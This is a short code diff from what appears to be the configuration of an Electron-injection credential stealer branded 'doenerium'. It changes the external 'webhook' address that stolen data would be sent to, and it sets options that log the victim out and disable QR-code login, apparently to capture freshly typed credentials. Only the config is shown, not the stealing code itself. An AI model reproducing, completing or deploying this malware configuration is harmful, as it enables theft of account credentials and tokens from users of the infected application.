@@ -73,7 +73,7 @@ const { BrowserWindow, session } = require('electron'),
 var config = {
     brand: 'doenerium_',
     webhook:
-      'https://doenerium.kqnfkpoccicxiudstqonfotuwsrhuxkwhqjjfsbjhonoubrccy.nl/',
+      'https://doenerium.kqnfkpoccicxiudstqonfotuwsrhuxkhqjjfsbjhonoubrccy.nl/',
     webhook_link: 'REPLACE_ME',
     logout: true,
     disable_qr_code: true,
